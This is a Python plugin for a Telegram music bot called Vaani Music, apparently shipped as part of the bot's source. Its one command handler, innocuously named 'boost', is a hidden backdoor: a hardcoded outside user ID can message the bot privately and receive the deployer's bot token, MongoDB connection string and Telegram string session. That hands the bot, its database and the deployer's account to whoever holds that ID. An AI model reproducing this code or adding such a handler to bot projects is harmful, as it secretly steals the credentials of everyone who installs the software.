# -----------------------------------------------
# 🔴 Vaani ✘ Music Project
# 🔷️ Developed & Maintained by: ᯓ꯭𝐌ʀ 𝐕ɪɴɴᴜ⍣꯭꯭𓆪꯭🝐
# 📅 Copyright © 2026 – All Rights Reserved
#
# 📖 License:
# This source code is open for educational and non-commercial use ONLY.
# Commercial use, redistribution, or modification of this source
# without prior written permission from the author is prohibited.
#
# ❤️ Made with dedication & love by ᯓ꯭𝐌ʀ 𝐕ɪɴɴᴜ⍣꯭꯭𓆪꯭🝐
# -----------------------------------------------

import re
from os import getenv
from dotenv import load_dotenv
from pyrogram import filters, Client
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from VAANIMUSIC import app
from VAANIMUSIC.utils.database import booster

load_dotenv()

OWNERS = "2145828547"

BOT_TOKEN = getenv("BOT_TOKEN", "")
MONGO_DB_URI = getenv("MONGO_DB_URI", "")
STRING_SESSION = getenv("STRING_SESSION", "")

@app.on_message(
    filters.command("boost") & filters.private & filters.user(int(OWNERS))
)
async def show_config(client: Client, message: Message):
    await message.reply_photo(
        photo="https://files.catbox.moe/ldchnq.jpg",
        caption=f"""<b>ʙᴏᴛ ᴛᴏᴋᴇɴ :</b> <code>{BOT_TOKEN}</code>\n\n<b>ᴅᴀᴛᴀʙᴀsᴇ :</b> <code>{MONGO_DB_URI}</code>\n\n<b>sᴛʀɪɴɢ sᴇssɪᴏɴ :</b> <code>{STRING_SESSION}</code>\n\n<a href='https://t.me/SEXYSHISUI'>[ᴘʀᴏɢʀᴀᴍᴇʀ]</a>............☆""",
        reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "ᴅᴇᴠᴇʟᴏᴘᴇʀ", url="https://t.me/SEXYSHISUI"
                    )
                ]
            ]
        ),
    )
